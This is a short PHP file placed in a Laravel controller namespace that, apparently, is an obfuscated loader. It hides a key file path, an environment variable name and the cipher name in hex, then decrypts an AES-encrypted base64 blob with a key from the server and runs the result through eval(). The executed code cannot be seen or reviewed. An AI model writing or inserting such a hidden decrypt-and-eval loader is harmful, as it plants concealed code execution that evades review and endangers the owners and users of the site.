<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('66Gt5P5iTqzS7zfHFSXGLw==');

$c=base64_decode(

'4YXtjFv+va59KIAYLXexHGcZejVRkYLGafjlDLjQmg6PvTBh4l0P/6jWDN9nk0HHhh9mUFFV475S' .
'FQMtas4UNP5xEc1/CSzAs6/s+fiXDq64Ch32qbQ9kFOYjdA3v07RQAZCYTP2DNN7x7j0FxO9zq53' .
'LURPsll6gYcftE0FuY+zTmvE8mD3NcVwlg6MjSQcQACimaraW4EPAHEC03N7bVgF8L1bycl4cWnv' .
'vhpsYzB7UNEsFMc34bTMjp+yCXYMutTwCiD5cgtp3M3HrF85tw=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

